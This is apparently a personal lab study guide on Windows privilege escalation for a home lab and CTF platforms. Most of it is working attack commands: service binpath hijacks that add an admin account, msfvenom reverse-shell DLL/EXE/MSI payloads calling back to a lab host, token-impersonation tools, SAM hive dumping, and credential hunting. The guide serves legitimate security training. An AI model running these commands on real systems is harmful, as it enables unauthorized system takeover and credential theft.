# 🪟 Phase 5: Windows Privilege Escalation (Week 7-8)

> **Goal**: Escalate from a low-privilege user to SYSTEM on Windows machines.
> **Your existing notes**: `Windows_Privilege_Esclation/` folder (14 docs!)

---

## 📋 Table of Contents

1. [Setup & Targets](#1-setup--targets)
2. [Situational Awareness](#2-situational-awareness)
3. [Service Exploitation](#3-service-exploitation)
4. [DLL Hijacking](#4-dll-hijacking)
5. [Unquoted Service Paths](#5-unquoted-service-paths)
6. [Scheduled Tasks](#6-scheduled-tasks)
7. [Token Impersonation](#7-token-impersonation)
8. [Registry Exploits](#8-registry-exploits)
9. [Credential Hunting](#9-credential-hunting)
10. [Automated Enumeration Tools](#10-automated-enumeration-tools)
11. [Practice on Online Platforms](#11-practice-on-online-platforms)
12. [Weekly Schedule](#12-weekly-schedule)
13. [Checklist & Progress Tracker](#13-checklist--progress-tracker)

---

## 1. Setup & Targets

| Target                         | Where to Get                              | Skills                |
| ------------------------------ | ----------------------------------------- | --------------------- |
| **Windows 10 Evaluation**      | microsoft.com/evalcenter (free, 90 days)  | Full PrivEsc practice |
| **Windows Server 2019/2022**   | microsoft.com/evalcenter (free, 180 days) | AD + PrivEsc          |
| **Metasploitable 3**           | github.com/rapid7/metasploitable3         | Windows vuln VM       |
| **TryHackMe: Windows PrivEsc** | tryhackme.com (free)                      | Guided exercises      |
| **TryHackMe: Steel Mountain**  | tryhackme.com                             | HFS exploit + PrivEsc |
| **HackTheBox: Archetype**      | hackthebox.com (free Starting Point)      | SQL → PrivEsc         |

### Quick Windows Eval Setup

```
1. Download Windows 10 Enterprise Evaluation from Microsoft
2. Create VM in VirtualBox (4GB RAM, 50GB disk)
3. Add to hacklab internal network
4. Create low-privilege user for testing
5. Create intentional misconfigurations (see below)
```

### Create Intentional Misconfigurations

```powershell
# Run as Administrator to set up practice scenarios:

# 1. Create a weak service
sc create VulnService binpath= "C:\Program Files\Vuln Service\service.exe" start= auto
# Set weak permissions:
sc sdset VulnService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;WD)"

# 2. Create unquoted service path
sc create UnquotedSvc binpath= "C:\Program Files\Unquoted Path Service\Common Files\service.exe" start= auto

# 3. Add scheduled task running as SYSTEM with writable script
schtasks /create /sc minute /mo 5 /tn "BackupTask" /tr "C:\Tasks\backup.bat" /ru SYSTEM

# 4. Store password in registry
reg add "HKLM\SOFTWARE\VulnApp" /v Password /t REG_SZ /d "SuperSecret123!"
```

---

## 2. Situational Awareness

> **Always start with enumeration!**

### 2.1 — System Information

```cmd
systeminfo                          :: Full system info
hostname                            :: Machine name
whoami                              :: Current user
whoami /priv                        :: Current privileges
whoami /all                         :: User + groups + privileges
echo %username%                     :: Username
```

### 2.2 — User & Group Enumeration

```cmd
net user                            :: List all users
net user administrator              :: Info about a user
net localgroup                      :: List all groups
net localgroup administrators       :: Members of admins
```

### 2.3 — Network Information

```cmd
ipconfig /all                       :: Network config
netstat -ano                        :: Active connections
arp -a                              :: ARP cache
route print                         :: Routing table
```

### 2.4 — Running Services & Processes

```cmd
tasklist /svc                       :: Running processes with services
wmic service list brief             :: All services
wmic service get name,displayname,pathname,startmode :: Service paths
sc query state= all                 :: All services (detailed)
```

### 2.5 — Installed Software

```cmd
wmic product get name,version       :: Installed programs
reg query HKLM\SOFTWARE             :: Registry software
dir "C:\Program Files"              :: Manually check
dir "C:\Program Files (x86)"        :: 32-bit programs
```

### 2.6 — Searching for Clues

```cmd
:: Search for files with passwords
dir /s /b C:\*.txt 2>nul | findstr /i "pass"
dir /s /b C:\*.ini 2>nul
dir /s /b C:\*.config 2>nul
dir /s /b C:\*.xml 2>nul

:: Search file contents for passwords
findstr /si "password" C:\*.txt C:\*.ini C:\*.config C:\*.xml 2>nul
findstr /si "password" C:\Users\*.txt 2>nul
```

---

## 3. Service Exploitation

### 3.1 — Weak Service Permissions

```cmd
:: Use accesschk (from Sysinternals)
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *

:: If you find a modifiable service:
sc qc VulnService                   :: Check service config
sc config VulnService binpath= "C:\temp\reverse.exe"
sc stop VulnService
sc start VulnService
:: Or add a user:
sc config VulnService binpath= "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
sc stop VulnService
sc start VulnService
```

### 3.2 — PowerUp (Automated Service Check)

```powershell
# Import PowerUp
Import-Module .\PowerUp.ps1
# Or bypass execution policy:
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Key commands:
Invoke-AllChecks                    # Run all checks
Get-ModifiableService               # Find modifiable services
Get-UnquotedService                 # Find unquoted paths
Get-ModifiablePath                  # Find writable program dirs
```

---

## 4. DLL Hijacking

```
Steps:
1. Find a program with missing DLLs (use Process Monitor)
   - Filter: Result = "NAME NOT FOUND", Path ends with ".dll"

2. Check if you can write to the application directory
   icacls "C:\Program Files\VulnerableApp\"

3. Create malicious DLL on Kali:
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f dll > evil.dll

4. Transfer DLL to target's writable directory

5. Start listener on Kali:
   nc -lvnp 4444

6. Restart the vulnerable service or wait for application restart
```

---

## 5. Unquoted Service Paths

```cmd
:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

:: Example vulnerable path:
:: C:\Program Files\Unquoted Path Service\Common Files\service.exe
:: Windows will try (in order):
:: C:\Program.exe
:: C:\Program Files\Unquoted.exe
:: C:\Program Files\Unquoted Path Service\Common.exe
:: C:\Program Files\Unquoted Path Service\Common Files\service.exe

:: Check which directories you can write to:
icacls "C:\Program Files\Unquoted Path Service\"

:: If writable, place your exe:
:: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe > Common.exe
:: Copy to: C:\Program Files\Unquoted Path Service\Common.exe
:: Restart the service
```

---

## 6. Scheduled Tasks

```cmd
:: List all scheduled tasks
schtasks /query /fo LIST /v

:: Look for tasks that:
:: 1. Run as SYSTEM or Administrator
:: 2. Reference writable paths
:: 3. Run regularly

:: If you find a writable script run by SYSTEM:
echo cmd.exe /c net user hacker Password123! /add > C:\Tasks\backup.bat
echo cmd.exe /c net localgroup administrators hacker /add >> C:\Tasks\backup.bat
:: Wait for task to execute... 
```

---

## 7. Token Impersonation

### SeImpersonatePrivilege

```cmd
:: Check if you have this privilege
whoami /priv

:: If SeImpersonatePrivilege is Enabled:
```

| Tool             | Command                                   | Works On           |
| ---------------- | ----------------------------------------- | ------------------ |
| **PrintSpoofer** | `PrintSpoofer.exe -i -c cmd`              | Win10/Server 2016+ |
| **GodPotato**    | `GodPotato.exe -cmd "cmd /c whoami"`      | All modern Windows |
| **JuicyPotato**  | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` | Win10 < 1809       |
| **SweetPotato**  | `SweetPotato.exe -p cmd.exe`              | Multiple versions  |

```cmd
:: Example with PrintSpoofer
PrintSpoofer.exe -i -c cmd
:: You now have SYSTEM!

:: Example with GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add"
```

### SeBackupPrivilege

```cmd
:: If SeBackupPrivilege is Enabled:
:: You can read any file on the system!

:: Copy SAM and SYSTEM hive
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

:: Transfer to Kali and extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## 8. Registry Exploits

### AlwaysInstallElevated

```cmd
:: Check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: If both are 0x1 (enabled):
:: On Kali, create malicious MSI:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f msi > evil.msi

:: On target:
msiexec /quiet /qn /i evil.msi
```

### AutoRun Programs

```cmd
:: Check for autorun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: If you can modify a registry autorun entry or replace the executable:
:: Replace the binary with your payload
:: Wait for user to log in
```

### Saved Credentials in Registry

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

---

## 9. Credential Hunting

### 9.1 — PowerShell History

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadLineOption).HistorySavePath
Select-String -Path (Get-PSReadLineOption).HistorySavePath -Pattern "password"
```

### 9.2 — Saved Credentials

```cmd
cmdkey /list                         :: Saved credentials
:: If credentials exist:
runas /savecred /user:admin cmd.exe
```

### 9.3 — SAM & SYSTEM Files

```cmd
:: Backup copies may exist:
dir C:\Windows\Repair\SAM
dir C:\Windows\Repair\SYSTEM
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM

:: Extract hashes on Kali:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 9.4 — Other Credential Sources

```cmd
:: WiFi passwords
netsh wlan show profile
netsh wlan show profile "WiFiName" key=clear

:: IIS config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

:: Unattended installation files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\sysprep\sysprep.xml
```

---

## 10. Automated Enumeration Tools

### WinPEAS

```cmd
:: Download: github.com/peass-ng/PEASS-ng/releases
winpeas.exe
:: or
winpeas.bat

:: Focus on RED and YELLOW findings
```

### PowerUp

```powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Seatbelt

```cmd
:: Comprehensive system enumeration
Seatbelt.exe -group=all
```

### Windows Exploit Suggester

```bash
# On Kali:
# First, save systeminfo output from target
python3 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
```

---

## 11. Practice on Online Platforms

| Platform   | Room / Machine             | Focus                   |
| ---------- | -------------------------- | ----------------------- |
| TryHackMe  | Windows PrivEsc            | All techniques (guided) |
| TryHackMe  | Windows PrivEsc Arena      | Practice environment    |
| TryHackMe  | Steel Mountain             | HFS + PrivEsc           |
| TryHackMe  | Alfred                     | Jenkins → PrivEsc       |
| TryHackMe  | Relevant                   | SMB + Token PrivEsc     |
| HackTheBox | Archetype (Starting Point) | SQL → PrivEsc           |
| HackTheBox | Optimum (Starting Point)   | Web → PrivEsc           |
| VulnHub    | Metasploitable 3           | Windows vuln VM         |

### LOLBAS Reference

> 🔗 https://lolbas-project.github.io/
> Living Off The Land Binaries and Scripts — legitimate Windows tools for exploitation.

---

## 12. Weekly Schedule

### Week 7 — Enumeration & Common Techniques

| Day | Activity                                  | Time  |
| --- | ----------------------------------------- | ----- |
| Mon | Situational awareness commands            | 2 hrs |
| Tue | Service exploitation + unquoted paths     | 2 hrs |
| Wed | DLL hijacking + scheduled tasks           | 2 hrs |
| Thu | Token impersonation (PrintSpoofer/Potato) | 2 hrs |
| Fri | Registry exploits + AlwaysInstallElevated | 2 hrs |
| Sat | TryHackMe: Windows PrivEsc room           | 3 hrs |
| Sun | Run WinPEAS, document findings            | 1 hr  |

### Week 8 — Credential Hunting & CTFs

| Day | Activity                                      | Time  |
| --- | --------------------------------------------- | ----- |
| Mon | PowerShell history mining                     | 2 hrs |
| Tue | SAM/SYSTEM extraction + hash cracking         | 2 hrs |
| Wed | Unattended install files + credential hunting | 2 hrs |
| Thu | TryHackMe: Steel Mountain                     | 3 hrs |
| Fri | HackTheBox: Archetype (Starting Point)        | 3 hrs |
| Sat | TryHackMe: Windows PrivEsc Arena              | 3 hrs |
| Sun | Review all techniques + write reports         | 2 hrs |

---

## 13. Checklist & Progress Tracker

### Situational Awareness
- [ ] systeminfo, whoami /all, whoami /priv
- [ ] net user, net localgroup administrators
- [ ] tasklist /svc, wmic service list
- [ ] netstat -ano, ipconfig /all

### Privilege Escalation Techniques
- [ ] Weak service permissions exploitation
- [ ] Unquoted service path exploitation
- [ ] DLL hijacking (Process Monitor method)
- [ ] Scheduled task exploitation
- [ ] SeImpersonatePrivilege (PrintSpoofer/Potato)
- [ ] SeBackupPrivilege (SAM/SYSTEM dump)
- [ ] AlwaysInstallElevated MSI attack
- [ ] Registry autorun modification

### Credential Hunting
- [ ] PowerShell history search
- [ ] cmdkey /list check
- [ ] Registry password search
- [ ] SAM/SYSTEM backup files
- [ ] Unattended install XML files
- [ ] WiFi passwords
- [ ] IIS web.config

### Automated Tools
- [ ] WinPEAS: run and analyze output
- [ ] PowerUp: Invoke-AllChecks
- [ ] Seatbelt: full enumeration
- [ ] Windows Exploit Suggester

### Online Platforms
- [ ] TryHackMe: Windows PrivEsc room
- [ ] TryHackMe: Steel Mountain
- [ ] HackTheBox: Archetype
- [ ] Written report for at least 1 machine

---

> **Previous**: [Phase 4 — Linux PrivEsc](../phase_4_linux_privesc/linux_privesc.md)
> **Next Phase**: [Phase 6 — Active Directory](../phase_6_active_directory/active_directory.md) 🏢
